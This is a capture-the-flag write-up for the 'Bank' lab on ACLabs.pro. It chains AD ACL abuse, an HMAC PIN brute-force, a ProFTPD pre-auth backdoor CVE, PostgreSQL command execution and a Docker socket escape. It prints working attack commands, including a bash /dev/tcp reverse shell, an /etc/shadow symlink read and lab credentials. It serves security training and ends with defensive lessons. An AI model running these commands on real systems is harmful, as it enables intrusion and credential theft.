# Bank — aclabs.pro

<img width="1200" height="630" alt="bank-writeup" src="https://github.com/user-attachments/assets/5b07cb5a-015d-4736-9a18-a7b15e8649f5" />


![](https://img.shields.io/badge/Platform-ACLabs.pro-blue?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![](https://img.shields.io/badge/OS-Windows%20%2B%20Linux-informational?style=for-the-badge)
![](https://img.shields.io/badge/Category-AD%20%7C%20Crypto%20%7C%20Web%20%7C%20Pivoting%20%7C%20Docker-orange?style=for-the-badge)
![](https://img.shields.io/badge/Flags-6%20%2F%206-brightgreen?style=for-the-badge)

## Summary

Bank is a **Hard**-rated multi-machine challenge on Aclabs.pro featuring 6 flags across two hosts and three network layers. The journey begins on a Windows domain controller running IIS, where a hidden script file leaks base64-encoded credentials for WinRM access (**Flag 1**). BloodHound reveals `GenericWrite` on the `Server Operators` group — self-addition grants `SeBackupPrivilege`, enabling admin desktop file exfiltration (**Flag 2**). A second network interface exposes a Linux host running a banking vault web app. The vault's session cookie uses HMAC-SHA256 with an 8-digit PIN as the key — a custom Python brute-forcer cracks it in minutes (**Flag 3**). Opening the vault unlocks new ports: ProFTPD 1.3.9 (vulnerable to CVE-2026-42167 pre-auth SQLi backdoor) leaks PostgreSQL credentials, and the database's `superuser` role enables RCE via `COPY FROM PROGRAM` into a Docker container (**Flag 4**). Inside the container, a custom SUID binary (`/usr/bin/cati`) — reversed with Ghidra — reads a hardcoded path as root; a symlink attack exposes `/etc/shadow`, and cracking the root hash grants container root (**Flag 5**). Finally, a writable `/var/run/docker.sock` allows spawning a privileged container with the host filesystem mounted, yielding the true root flag (**Flag 6**).

```
Hidden Script → Base64 Creds → WinRM (Flag 1)
  → GenericWrite ACL → Server Operators → SeBackupPrivilege (Flag 2)
  → Second NIC → Ligolo Pivot → HMAC PIN Brute-Force (Flag 3)
  → ProFTPD CVE-2026-42167 → PostgreSQL RCE → Container (Flag 4)
  → SUID Binary Reversing → Symlink /etc/shadow → Container Root (Flag 5)
  → Docker Socket Escape → Host Root (Flag 6)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| Source code & hidden file discovery | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Active Scanning: Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/) | `T1595.002` |
| Base64 credentials in script | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) | `T1552.001` |
| WinRM remote access | [Lateral Movement](https://attack.mitre.org/tactics/TA0008/) | [Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) | `T1021.006` |
| GenericWrite ACL abuse | [Persistence](https://attack.mitre.org/tactics/TA0003/) | [Account Manipulation](https://attack.mitre.org/techniques/T1098/) | `T1098` |
| SeBackupPrivilege file copy | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [OS Credential Dumping: Security Account Manager](https://attack.mitre.org/techniques/T1003/002/) | `T1003.002` |
| Internal network scanning | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Remote System Discovery](https://attack.mitre.org/techniques/T1018/) | `T1018` |
| HMAC PIN brute-force | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | `T1110.002` |
| ProFTPD pre-auth backdoor | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| PostgreSQL COPY FROM PROGRAM | [Execution](https://attack.mitre.org/tactics/TA0002/) | [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | `T1059.004` |
| Custom SUID binary abuse | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Abuse Elevation Control: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) | `T1548.001` |
| /etc/shadow hash cracking | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | `T1110.002` |
| Docker socket container escape | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Escape to Host](https://attack.mitre.org/techniques/T1611/) | `T1611` |

## CVE Reference

| CVE | CVSS 3.1 | Severity | Description |
|:----|:---------|:---------|:------------|
| [CVE-2026-42167](https://github.com/ZeroPathAI/proftpd-CVE-2026-42167-poc) | **9.8** | Critical | ProFTPD 1.3.9 pre-auth SQL injection via `is_escaped_text()` bypass — enables backdoor user creation with uid=0 |


---

## Reconnaissance — `T1046` `T1595.002`

### Nmap

```bash
sudo nmap -sC -sV -v 10.10.10.211 -Pn
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                             (Domain: bank.acl)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

A Windows domain controller (`bank.acl`) running IIS on port 80 and WinRM on 5985.

### Web Enumeration

<img width="1919" height="929" alt="Aclabs_bank_first_web" src="https://github.com/user-attachments/assets/13f868c4-9c1e-4917-ac73-cee56303040b" />

The landing page introduces us to Kotofey Sherstyanoy, a bank employee who works for food. The humor is appreciated. The source code, however, is more useful:

<img width="1920" height="963" alt="Aclabs_bank_first_web_source_code" src="https://github.com/user-attachments/assets/a9c744d6-6429-40b5-bbce-60dfd845382e" />

A reference to `devops.php` — let's investigate.

<img width="1919" height="961" alt="Aclabs_bank_first_web_devops php" src="https://github.com/user-attachments/assets/9e209d00-9166-4c05-9d23-90acd1ac7f9b" />

The page documents an `employees/` directory structure: employee text files are stored there, but hidden files (prefixed with `.`) don't display in the listing — though the counter still increments, confirming their existence.

### Hidden File Fuzzing

Fuzzing the `employees/` directory with a dot prefix and `.txt` extension:

```bash
ffuf -u http://10.10.10.211/employees/.FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -ic -c -e .txt
```

```
script.txt  [Status: 200, Size: 3159, Duration: 87ms]
```

The file contains Cyrillic text (use `curl` instead of a browser for correct rendering):

<img width="1919" height="962" alt="Aclabs_bank_web_hidden_scripts" src="https://github.com/user-attachments/assets/cc4ebc9b-29ea-4292-8a5c-5f0076cd117c" />

The `encoded_credentials` field looks like base64:

```bash
echo 'd2ViLXNydiA6IEZoM296RmFHM3lMeWhOIXA=' | base64 -d
web-srv : Fh3ozFaG3yLyhN!p
```

### Credential Validation — `T1552.001`

```bash
nxc winrm 10.10.10.211 -u web-srv -p 'Fh3ozFaG3yLyhN!p'
```

```
WINRM  10.10.10.211  5985  WIN-TSQ2V8LHSN5  [+] bank.acl\web-srv:Fh3ozFaG3yLyhN!p (Pwn3d!)
```

## Flag 1 — WinRM Access — `T1021.006`

```bash
evil-winrm -i 10.10.10.211 -u 'web-srv' -p 'Fh3ozFaG3yLyhN!p'
```

Flag on the desktop. First blood.

## Flag 2 — ACL Abuse + SeBackupPrivilege — `T1098` `T1003.002`

Initial privileges are minimal:

<img width="1919" height="895" alt="Aclabs_bank_web-srv_privs" src="https://github.com/user-attachments/assets/7a0b6e45-524f-45a4-85db-958c7ad87e0b" />

SharpHound collection and BloodHound analysis reveal the escalation path:

<img width="1919" height="962" alt="Aclabs_bank_BloodHound_vector" src="https://github.com/user-attachments/assets/c223ca2e-0e77-4481-9eb0-ff9f2ef7a440" />

`web-srv` has **GenericWrite** on the `Server Operators` group — meaning we can add ourselves as a member.

```powershell
Add-ADGroupMember -Identity "Server Operators" -Members "web-srv"
```

Re-authenticate to refresh the token, then check privileges:

<img width="1919" height="962" alt="Aclabs_bank_web-srv_privs_after_add" src="https://github.com/user-attachments/assets/887ceea8-cc89-4569-aad8-4bdb572ee1bb" />

`SeBackupPrivilege` and `SeRestorePrivilege` are now available. Instead of escalating to SYSTEM (unnecessary for this task), use `Robocopy` in backup mode to copy the Administrator's desktop:

```powershell
robocopy /b C:\Users\Administrator\Desktop C:\Users\web-srv\Desktop /E
```

> **Why Robocopy?** The `/b` flag activates Backup Mode, which uses `SeBackupPrivilege` to bypass NTFS ACLs. It's cleaner and quieter than SAM/SYSTEM hive extraction when you just need to read specific files.

Flag 2 on the copied desktop.

---

## Flag 3 — Pivoting + HMAC PIN Brute-Force — `T1018` `T1110.002`

### Network Discovery

Checking network interfaces reveals a second NIC:

```
Ethernet adapter Ethernet 2:
   IPv4 Address: 10.10.20.5
   Subnet Mask:  255.255.255.0
```

A PowerShell TCP scanner (since `nmap` produces unreliable results through WinRM without `--unprivileged`):

```powershell
$subnet = "10.10.20."
$targets = 1..254 | ForEach-Object { "$subnet$_" }
$ports = @(80)

foreach($t in $targets) {
    foreach($p in $ports) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $r = $tcp.BeginConnect($t, $p, $null, $null)
        if($r.AsyncWaitHandle.WaitOne(200, $false) -and $tcp.Connected) {
            "$t`:$p OPEN"
        }
        $tcp.Close()
    }
}
```

<img width="1919" height="868" alt="Aclabs_bank_python_scan" src="https://github.com/user-attachments/assets/b13302fc-8508-4036-9b9d-36801807e345" />

### Ligolo-ng Tunnel

```bash
# Attacker
sudo ligolo-proxy -selfcert

# Windows target
.\ligolo-windows.exe -connect 10.20.10.3:11601 -ignore-cert
```

<img width="964" height="752" alt="Aclabs_bank_ligolo-ng_server" src="https://github.com/user-attachments/assets/b3129726-ace9-496e-8799-f968bff02aae" />

Configure autoroute for `10.10.20.0/24`, create a virtual interface, and start the tunnel.

### The Vault

<img width="1919" height="963" alt="Aclabs_bank_new_host_bank" src="https://github.com/user-attachments/assets/2b7301ce-9796-4899-b09b-ea56a7b65b8f" />

An 8-digit PIN protects the vault. Fuzzing reveals a `status.txt` (currently empty), and image steganography yields nothing.

Intercepting the request in Burp reveals a `vault-signature` cookie — identified via hashes.com as **SHA-256**:


Further research points to **HMAC** (Hash-based Message Authentication Code):

<img width="1783" height="808" alt="Aclabs_bank_sha256:hmac" src="https://github.com/user-attachments/assets/4381f36f-c2f9-4fdf-96b8-d6c7e2a52635" />

The server generates the cookie as `HMAC-SHA256(PIN, "Vault3")`. With 8 digits, that's 100 million combinations — brute-forceable:

```python
import hmac, hashlib

target = "vault-signature-value-here"

for i in range(100_000_000):
    pin = f"{i:08d}".encode()
    sig = hmac.new(pin, b"Vault3", hashlib.sha256).hexdigest()
    if sig == target:
        print(f"PIN FOUND: {pin.decode()}")
        break
```

The PIN cracks, the vault opens:

<img width="1919" height="961" alt="Aclabs_bank_vault_open" src="https://github.com/user-attachments/assets/ca4bdecf-38a9-4695-a36a-fa4c913ba506" />

**Flag 3** in the page source.

## Flag 4 — ProFTPD Backdoor + PostgreSQL RCE — `T1190` `T1059.004`

Opening the vault changes the infrastructure — `status.txt` now reads "opened," and new ports appear:

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        ProFTPD 1.3.9
80/tcp   open  http       nginx
5432/tcp open  postgresql PostgreSQL DB
```

### ProFTPD CVE-2026-42167

ProFTPD 1.3.9 is vulnerable to a pre-auth SQL injection that creates a backdoor user with uid=0:

```bash
python3 preauth_user_backdoor.py --host 10.10.20.227 --port 21
```

```
[+] SUCCESS — User 'backdoor' injected and login confirmed!
[+] Homedir is / with uid=0 — full filesystem access
```

> **Note:** The RCE variant of this CVE didn't work in this environment, but the backdoor user injection succeeded — granting root-level FTP access to the entire filesystem.

Exploring the filesystem reveals PostgreSQL credentials in `/etc/proftpd/proftpd.conf`:

<img width="1919" height="961" alt="Aclabs_bank_ftp_found_creds_to_postgres" src="https://github.com/user-attachments/assets/f2de71bd-721d-441d-b150-fc159b8080d4" />

### PostgreSQL RCE

```bash
psql -h 10.10.20.227 -U <user> -d <db>
```

<img width="1391" height="674" alt="Aclabs_bank_posgres_check_role" src="https://github.com/user-attachments/assets/59ecd395-1c97-4b65-986f-75d152077e06" />

The role has `superuser` privileges — `COPY FROM PROGRAM` is available for RCE. Set up a Ligolo listener to forward the reverse shell through the Windows pivot:

```bash
# On Ligolo proxy
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.20.5/4444 0>&1"';
```

<img width="1919" height="962" alt="Aclabs_bank_reverse_shell_postgres" src="https://github.com/user-attachments/assets/018ca2fa-f29e-4bc1-a9f6-d3f0104932e8" />

**Flag 4** in the container root.

## Flag 5 — Custom SUID Binary Reversing — `T1548.001`

### Discovering the Binary

```bash
find / -perm /4000 2>/dev/null
```

Among standard SUID binaries, one stands out: `/usr/bin/cati`. Running it appears to do nothing — it's a custom binary that needs reversing.

### File Transfer Through Ligolo

The container has `curl` but no outbound internet. Set up a Python upload server on the attacker, add a Ligolo listener, and push the binary:

```bash
# Attacker
pip install uploadserver
python3 -m uploadserver 8000

# Ligolo
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000

# Container
curl -F 'files=@/usr/bin/cati' http://10.10.20.5:8000/upload
```

> **Always verify file integrity after transfer:** `md5sum` on both ends. A previous attempt via PostgreSQL silently truncated the file by 10KB, producing incomprehensible Ghidra output.

```bash
# Container
md5sum /usr/bin/cati
bc47ec77ddd8241529723377d04cfcac

# Attacker
md5sum cati
bc47ec77ddd8241529723377d04cfcac
```

### Ghidra Analysis

<img width="1919" height="961" alt="Aclabs_bank_cati_suid_reverse" src="https://github.com/user-attachments/assets/ba53ea42-a857-431c-8d22-69f765e0e245" />

The binary's logic: set `uid=0` (root), then read and print the contents of `/var/www/html/input`. Since the binary runs as root regardless of the caller, a **symlink attack** lets us read any file:

```bash
ln -s /etc/shadow /var/www/html/input
/usr/bin/cati
```

```
root:$6$nxGr5FDXne2CqqAp$ZHJIV059PkH8fZbt8s/yXb4QjZLnSM3vGCAQf4rNpo9YF6wXXiYr5kt4uFxdAmwgkpIWJmmYQdakXuFqEhQx20:20578:0:99999:7:::
```

<img width="1919" height="962" alt="Aclabs_bank_etc_shadow_hashcat_cracked" src="https://github.com/user-attachments/assets/b27ebebe-b6b4-4abf-ae00-2e2417157d77" />

Crack the SHA-512 hash, `su` to root. **Flag 5** captured.

## Flag 6 — Docker Socket Escape — `T1611`

Root inside the container, but not on the host. Checking for escape vectors:

```bash
ls -la /var/run/docker.sock
srw-rw---- 1 root 103 0 Jun 29 15:00 /var/run/docker.sock
```

The Docker socket is writable. The Docker daemon on the **host** listens on this socket and processes any request with root privileges — regardless of whether it originates from the host or a container.

### Spawning a Privileged Container

Create a new container that mounts the host's root filesystem:

```bash
curl -s --unix-socket /var/run/docker.sock \
    -X POST http://localhost/containers/create \
    -H "Content-Type: application/json" \
    -d '{
        "Image": "alpine",
        "Cmd": ["cat", "/var/tmp/root/root.txt"],
        "Binds": ["/:/var/tmp"],
        "Privileged": true
    }'
```

Start the container and read the output:

```bash
# Start
curl -s --unix-socket /var/run/docker.sock \
    -X POST "http://localhost/containers/<ID>/start"

# Read logs
curl -s --unix-socket /var/run/docker.sock \
    "http://localhost/containers/<ID>/logs?stdout=1&stderr=1"
```

<img width="1919" height="959" alt="Aclabs_bank_final_root_flag" src="https://github.com/user-attachments/assets/e03998f4-4b83-439d-95ff-d449c3aac0f6" />

**Flag 6** — host root. All six flags captured.

> **Credit:** The machine creator Mr.Exploit demonstrated an alternative approach using a reverse shell from the Docker-spawned container, which is arguably more practical for real engagements. Full video walkthrough available on [Mr.Exploit's YouTube channel](https://youtu.be/g2H8EXMoAC8?si=BSaZSYD4GMzsKUiI).

## Lessons Learned

1. **Hidden files in web directories are findable if you know the naming convention.** The `devops.php` page hinted at dot-prefixed files that don't display in listings. Fuzzing with a `.` prefix and common wordlists found `.script.txt` almost immediately — a reminder that "hidden" on a web server is a UI concept, not a security boundary.

2. **GenericWrite on privileged groups is a one-command escalation.** Self-addition to `Server Operators` via `Add-ADGroupMember` granted `SeBackupPrivilege` — which bypasses NTFS ACLs entirely. In AD environments, always check BloodHound for writable group memberships before hunting for traditional privilege escalation vectors.

3. **HMAC with a short numeric key is brute-forceable.** 8-digit PINs produce only 100 million HMAC-SHA256 combinations — crackable in minutes with a Python script. Cryptographic strength means nothing when the key space is small. Real-world implementations should use high-entropy keys or add rate limiting.

4. **Ligolo-ng listener forwarding is essential for multi-hop reverse shells.** The PostgreSQL reverse shell had to route through the Windows pivot. Forgetting to add a `listener_add` rule means the shell connects to the wrong host — an easy mistake when working across three network layers.

5. **Always verify file hashes after cross-network transfers.** A truncated binary produced garbage in Ghidra, wasting hours. A 5-second `md5sum` check on both ends prevents this entirely.

6. **A writable Docker socket inside a container is game over for the host.** The Docker daemon doesn't authenticate requests by source — container or host, if you can write to the socket, you control the daemon. Mount the host filesystem, read any file, spawn any process. In production, Docker sockets should never be mounted into containers without extreme justification.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
